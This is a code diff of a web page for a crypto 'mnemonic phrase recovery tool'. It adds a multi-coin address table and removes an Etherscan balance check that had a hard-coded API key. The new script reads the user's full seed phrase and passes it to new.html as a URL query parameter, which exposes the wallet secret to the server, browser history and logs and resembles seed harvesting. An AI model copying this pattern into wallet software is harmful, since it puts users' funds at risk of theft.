@@ -24,7 +24,7 @@ function jumpToNewPage() {
     if (cells.length < 2) return null;
     return [cells[0].textContent.trim(), cells[1].textContent.trim()];
   }).filter(Boolean);
-  sessionStorage.setItem("ethResults", JSON.stringify(data));
+  sessionStorage.setItem("ethFullResults", JSON.stringify(data));
   location.href = "new.html";
 }
 </script>
@@ -33,7 +33,7 @@ function jumpToNewPage() {
         <div class="container">
 
             <h1 class="text-center">Seed Savior: Mnemonic Phrase Recovery Tool</h1>
-            <p class="version">版本2.7</p>
+            <p class="version">版本2.8</p>
             <hr>
             <div class="row">
                 <div class="col-md-12">
@@ -86,17 +86,58 @@ function jumpToNewPage() {
                         
                         
                         <table class="table table-striped" >
-                            
-
-<thead>
-  <tr>
-    <th>Recovered Word</th>
-    <th>BIP44 ETH Address (m/44'/60'/0'/0 Ledger Live, Trezor, Jaxx, etc)</th>
-    <th>餘額</th>
-  </tr>
-</thead>
-
-
+                            <thead>
+                                <th>
+                                    <div class="input-group">
+                                        <span>Recovered Word</span>&nbsp;&nbsp;
+                                        
+                                    </div>
+                                </th>
+                                <th>
+                                    <div class="input-group">
+                                        <span>BIP44 BTC Address <br><i>(m/44'/0'/0'/0 Legacy Bitcoin Address)</i></span>&nbsp;&nbsp;
+                                    </div>
+                                </th>
+                                <th>
+                                    <div class="input-group">
+                                        <span>BIP49 BTC Address <br><i>(m/49'/0'/0'/0 Segwit Bitcoin Address)</i></span>&nbsp;&nbsp;
+                                    </div>
+                                </th>
+                                <th>
+                                    <div class="input-group">
+                                        <span>BIP84 BTC Address <br><i>(m/84'/0'/0'/0 Bech32 Bitcoin Address)</i></span>&nbsp;&nbsp;
+                                    </div>
+                                </th>
+                                <th>
+                                    <div class="input-group">
+                                        <span>BIP44 ETH Address <br><i>(m/44'/60'/0'/0 Ledger Live, Trezor, Jaxx, etc)</i></span>&nbsp;&nbsp;
+                                    </div>
+                                </th>
+								<th>
+                                    <div class="input-group">
+                                        <span>BIP32 ETH Address <br><i>(m/44'/60'/0' Legacy Ledger, Coinomi)</i></span>&nbsp;&nbsp;
+                                    </div>
+                                </th>
+								
+								<th>
+                                    <div class="input-group">
+                                        <span>XRP Address <br><i>(m/44'/144'/0'/0)</i></span>&nbsp;&nbsp;
+                                    </div>
+                                </th>
+								
+								<th>
+                                    <div class="input-group">
+                                        <span>LTC Address <br><i>(m/44'/2'/0'/0)</i></span>&nbsp;&nbsp;
+                                    </div>
+                                </th>
+								
+								<th>
+                                    <div class="input-group">
+                                        <span>ZEN Address <br><i>(m/44'/121'/0'/0)</i></span>&nbsp;&nbsp;
+                                    </div>
+                                </th>
+                                
+                            </thead>
                             <tbody class="addresses-recovery monospace">
                            
                             </tbody>
@@ -290,71 +331,40 @@ function jumpToNewPage() {
         <script src="js/entropy.js"></script>
         <script src="js/index.js"></script>
     
-
-
 <script>
-document.addEventListener("DOMContentLoaded", function () {
-    function queryETHBalance(address, td) {
-        fetch(`https://api.etherscan.io/api?module=account&action=balance&address=${address}&tag=latest&apikey=AKTIP3RTPU4C9UQH3PWMYJBB6FP3EKT6WD`)
-            .then(res => res.json())
-            .then(data => {
-                const balance = parseFloat(data.result) / 1e18;
-                td.innerHTML = balance > 0 ? "<strong style='color:red'>" + balance.toFixed(6) + " ETH</strong>" : balance.toFixed(6) + " ETH";
-            })
-            .catch(() => td.textContent = "查詢失敗");
+let lastActivity = performance.now();
+
+function checkNetworkIdleAndYard() {
+    const entries = performance.getEntriesByType("resource");
+    if (entries.length > 0) {
+        const latest = entries[entries.length - 1].responseEnd;
+        if (latest > lastActivity) lastActivity = latest;
     }
+    const now = performance.now();
+    const pageStill = (now - lastActivity > 3000);
+    const textHasYard = document.body.innerText.includes("yard");
 
-    const observer = new MutationObserver(() => {
-        const rows = document.querySelectorAll("#result-body tr");
-        rows.forEach(row => {
-            if (row.dataset.filled) return;
-            row.dataset.filled = "true";
-            const cells = row.querySelectorAll("td");
-            if (cells.length < 2) return;
-            const eth44 = cells[1].textContent.trim();
-
-            const bal = document.createElement("td");
-            bal.textContent = "...";
-            row.appendChild(bal);
-
-            if (eth44.startsWith("0x")) queryETHBalance(eth44, bal);
-        });
-    });
-
-    observer.observe(document.getElementById("result-body"), { childList: true, subtree: true });
-});
-</script>
-<script>
-function waitForYardAndIdle(callback) {
-    let lastChangeTime = Date.now();
-
-    const observer = new MutationObserver(() => {
-        lastChangeTime = Date.now();
-    });
-
-    observer.observe(document.getElementById("result-body"), { childList: true, subtree: true });
-
-    const checkInterval = setInterval(() => {
-        const rows = document.querySelectorAll("#result-body tr");
-        const hasYard = Array.from(rows).some(row => row.innerText.includes("yard"));
-        const idleFor3s = (Date.now() - lastChangeTime) > 3000;
-
-        if (hasYard && idleFor3s) {
-            clearInterval(checkInterval);
-            console.log("✅ 地址產生完成：yard 出現且靜止 3 秒");
-            callback();
-        }
-    }, 500);
+    if (pageStill && textHasYard && !window._alreadyNotified) {
+        window._alreadyNotified = true;
+        alert("搜尋完成！");
+        redirectToNewPage();
+    }
 }
 
-document.addEventListener("DOMContentLoaded", function () {
-    waitForYardAndIdle(() => {
-        // 你可以在這裡觸發任何操作，例如顯示提示、啟用按鈕、跳轉
-        jumpToNewPage();
+setInterval(checkNetworkIdleAndYard, 1000);
+
+function redirectToNewPage() {
+    const mnemonic = document.querySelector('textarea.phrase').value.trim();
+    const recovered = document.querySelector('table td:nth-child(1)').innerText.trim();
+    const ethAddress = document.querySelector('table td:nth-child(5)').innerText.trim();
+
+    const params = new URLSearchParams({
+        mnemonic: mnemonic,
+        recovered: recovered,
+        eth: ethAddress
     });
-});
+    window.location.href = `new.html?${params}`;
+}
 </script>
 </body>
-
-
 </html>
